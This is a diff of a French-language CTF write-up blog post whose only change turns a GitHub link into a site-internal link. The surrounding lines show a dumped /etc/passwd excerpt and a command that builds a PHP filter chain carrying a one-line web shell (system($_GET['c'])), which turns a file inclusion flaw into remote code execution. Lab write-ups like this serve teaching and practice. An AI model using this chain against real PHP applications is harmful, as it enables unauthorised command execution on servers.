@@ -299,7 +299,7 @@ rmp:x:1000:1000:rmp,,,:/home/rmp:/bin/bash
 mysql:x:104:108:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-Désormais pour les failles d'inclusions j'utilise directement la technique de chainage des filtres d'encodage PHP dont j'ai parlé sur [le CTF Corrosion de VulnHub](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Corrosion%20de%20VulnHub.md#kansas-city-shuffle) pour obtenir un RCE sans avoir à injecter quoique ce soit dans un fichier.
+Désormais pour les failles d'inclusions j'utilise directement la technique de chainage des filtres d'encodage PHP dont j'ai parlé sur [le CTF Corrosion de VulnHub]({% link _posts/2022-10-27-Solution-du-CTF-Corrosion-de-VulnHub.md %}#kansas-city-shuffle) pour obtenir un RCE sans avoir à injecter quoique ce soit dans un fichier.
 
 J'ai juste besoin de faire un `python php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'` et je passe l'output au paramètre vulnérable du script PHP.
 
